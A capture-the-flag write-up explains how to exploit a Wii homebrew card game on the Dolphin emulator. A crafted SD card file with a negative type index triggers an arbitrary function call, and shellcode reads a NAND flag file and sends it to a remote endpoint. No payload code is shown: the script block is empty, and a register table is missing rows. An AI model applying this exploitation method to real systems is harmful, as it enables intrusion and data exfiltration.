> Hey, my cousin lent me this Wii game we used to play together when we were kids. It was really cool because the developers also sold custom SD cards with additional cards to be added to the game. Man those were the days. Anyway I heard on Reddit that you can use it to install the Homebrew Channel. Anyone know how to do that?
<br><br>Author: Frank01001<br><br>**Goal**: get the contents of `/sys/flag` in system NAND<br>**Remote**: Dolphin 2506a emulator on Linux. The build has been patched to enable the use of networking in TAS (so you can provide us input). The patch is included in the attachments.<br><br>You are advised to use the same build on the same OS to avoid problems. Dolphin networking may encounter some issues on Windows. The web server used by the game in localhost is provided in the attachments as a "dummy" server that the game could have used in its intended functionality, but has not bearing on the challenge.

> Note: The writeup is written for a slightly older build of the challenge, however the only difference in the exploit is with the addresses used in the shellcode, which can be easily adapted to the new version. The game code is the same, so the exploit logic remains unchanged. To avoid further changes of addresses and allow remote reliability.

Special thanks to [danmaam](https://github.com/danmaam) for handling the cursed remote deployment of the challenge. The process of deployment deserved its own writeup, which you can find [here](/blog/2025-07-20-forsaken-tower-deployment).

## Challenge Overview
The challenge is a Wii homebrew game in ELF format (I had some compassion and scrapped the idea of giving the DOL format). All symbols are there, so there isn't much reversing to do, except getting acquainted with the codebase. The game has a splash screen and a menu, where you can download cards from the official servers (not hosted remotely, they are irrelevant to the challenge) or load ones from the SD card. We are also told the game runs on Dolphin 2506a and that the flag is in system NAND at `/sys/flag`.

When examining the code that updates the card info on the UI after selecting a different card, you can see an issue with how the card type is handled.

![vuln](/writeup_files/forsaken-tower/vulnplace.png)

The card type (a **signed int**) is checked for values greater than the maximum type defined in the type enum, but not for negative values. The type's value is used as a pseudo-jump table index to call the appropriate function for rendering each card type. Therefore, passing a negative value will result in calling an undefined function, potentially an arbitrary function call.

### The Card File Format
With minimal reverse engineering of the ROM, you can reconstruct the file format used for game cards. 

| Offset | Description |
|--------|-------------|
| 0x00-0x06 | Magic (ASCII of `FTCARD`) |
| 0x06-0x08 | ID (unsigned short) |
| 0x08-0x0c | Size of JPEG image content (unsigned int) |
| 0x0c-0x10 | Offset of JPEG image in the file (unsigned int) |
| 0x10-0x11 | Card type number (0 for monster, 1 for spell, 2 for trap) |
| 0x11-0x14 | Zero padding |
| 0x14-0x16 | Attack value (unsigned short) |
| 0x16-0x18 | Defense value (unsigned short) |
| 0x18-... | Name (null terminated string) |
| ... | Description (right after Name, null terminated) |
| [JPEG offset] | JPEG content (size defined at 0x08-0x0c) |

All numbers are Big-Endian, since the Wii's Broadway CPU is PPC32 Big-Endian. The card ID is used to identify the card in the game, and the JPEG image is used as the card's visual representation. The name and description are null-terminated strings that provide additional information about the card.

Given the structure of the file format, we have plenty of space to store the shellcode and every string required by the exploit, including the URL to send the flag to.

## Exploitation
The game runs on Dolphin, where the file access control model is ignored and every file in NAND is readable and writable. Also, by exploring the game code a bit, we can locate interesting library functions and utilities, specifically:
- `ISFS_Open` and `ISFS_Read` functions, included from `libogc`, which allow file system access.
- `make_request`, which the game uses to download cards from the official game servers. The function takes a bare URL (without scheme), a port, content pointer and size.

Reusing this code, we can significantly simplify the exploit, which consists of a PowerPC 32 Big-Endian shellcode that:
1. Opens the file `/sys/flag` using `ISFS_Open`.
2. Reads the file into a buffer using `ISFS_Read`.
3. Calls `make_request` with the buffer to send the flag to a remote server.

You can debug the exploit by running Dolphin with `--debugger` from command line. Here, you can also disable the JIT engine if you need to, or clean up its cache. JIT cache is definitely something you have to be careful with, as it can lead to unexpected behavior when debugging.

### Debugging Setup
> Reminder: The code and stack addresses in the following sections refer to the older build of the challenge.

For the purposes of debugging, it's handy to put a breakpoint at `0x8000B618`, the instruction in `_setCardInfo` which fetches the correct function pointer from the array on the stack. The next instructions will call the retrieved pointer to handle the UI setup for the corresponding card type.

![debugger](/writeup_files/forsaken-tower/debugger.png)

### Calling Convention
Before continuing, it is useful to know some relevant aspects of the PowerPC calling convention, so that we can better understand what is going on in the code.

| Register(s)              | Purpose                                                         | Category                                     |

| **r5**            | 3rd integer/pointer argument                                    | Volatile                     |
| ... |                     |
| **r10**          | 8th integer/pointer argument                                    | Volatile                     |
| **r14–r31**          | General‐purpose nonvolatile registers (callee‐saved)            | Nonvolatile                  |
| **FPR0**                 | Scratch floating-point register                                 | Volatile                     |
| **FPR1**                 | 1st floating-point argument; also holds 1st FP return value     | Volatile                     |
| **FPR2**                 | 2nd floating-point argument; also part of multi-regs FP return  | Volatile                     |
| **FPR3–FPR13**           | 3rd–13th floating-point arguments                               | Volatile                     |
| **FPR14–FPR31**          | Floating-point nonvolatile registers (callee-saved)             | Nonvolatile                  |
| **LR (Link Register)**   | Holds return address for subroutine calls                       | Special |

Knowing that r1 is used as the stack pointer, we can check out the state of the stack when hitting the breakpoint. The stack pointer is at `0x808626d0`. From IDA, we gathered that the table of function calls is at `sp+108h`. Luckly for us, our array of function pointers is right after the temporary buffer where the card description is placed.

![stack](/writeup_files/forsaken-tower/stack.png)

In the figure, the brown pointer is that of the `setMonsterCardInfo` function. After that, `setSpellCardInfo`, `setTrapCardInfo`, and `unknownCardTypeInfo` follow in cyan, purple, and grey. If you put a pointer to your shellcode in the card’s description, you can line it up so a negative type value jumps straight to it.

To simplify the inclusion of required strings, we can use a second crafted card with the path to the flag and the url of the endpoint where we want the flag to be sent (I used [ngrok](https://ngrok.com/) for simplicity). The game loads cards in alphabetical order, so we can control where each card data will end up in memory.

![othercard](/writeup_files/forsaken-tower/other_card.png)

To copy the name and description from a card, the game uses [`strncpy`](https://man7.org/linux/man-pages/man3/strncpy.3p.html). Therefore, our shellcode must contain no null bytes (or rely on the dirty buffer used to load the original file, a risky option). For improved reliability, my shellcode contains no null bytes.

![strncpy](/writeup_files/forsaken-tower/strncpy.png)

Making a mistake in the exploit is pretty noticeable, as the game will crash with an exception containing the general purpose register values and the the call stack trace.
![ded](/writeup_files/forsaken-tower/ded.png)

The following are the scripts used to generate the cards, in this case we include addresses from the latest build of the game, which is the one you will find in the attachments. The first script generates the shellcode, while the second one generates the two cards:

```

## Putting it all together
Finally, we can put the cards in the SD folder that the game uses (`/apps/forsaken_tower/content/`)

Then, when the game is in the main menu, we press B on "Get New Cards"

![main_menu](/writeup_files/forsaken-tower/main_menu.png)

Then we press B again on "Check SD Card"

![get_cards](/writeup_files/forsaken-tower/get_cards.png)

Now the cards are loaded and saved in the Wii NAND at `/title/12345678/00000002/content/` and can be loaded to be rendered in their full glory.

Going to "Your Deck", you can see builtin cards together with your custom cards from the SD and, if any, cards downloaded from the game servers. In the following screenshot, for example, we can see the card with relevant strings being rendered to the player. As an easter egg, I included the image of a ATM bus (ATM is the public transportation company in Milano). When you press left on the DPAD, the game will try to load the exploit card, executing the arbitrary shellcode and sending you the flag.

![strings_card](/writeup_files/forsaken-tower/strings_card.png)

And sure enough, after running the exploit, we get the flag on our endpoint.
